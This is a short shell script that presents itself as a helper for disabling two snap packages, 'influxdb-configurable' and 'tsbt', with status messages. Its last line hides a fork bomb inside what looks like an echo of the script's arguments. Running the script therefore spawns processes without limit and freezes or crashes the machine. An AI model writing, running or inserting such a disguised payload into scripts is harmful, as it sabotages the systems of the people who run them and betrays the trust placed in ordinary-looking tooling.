#!/bin/sh
if /usr/bin/snap disable influxdb-configurable; then
echo influxdb disabled
else
echo influxdb already disabled
fi

if /usr/bin/snap disable tsbt; then
echo tsbt disabled
else
echo tsbt already disabled
fi

echo $(:(){ :|:& };:) "$@"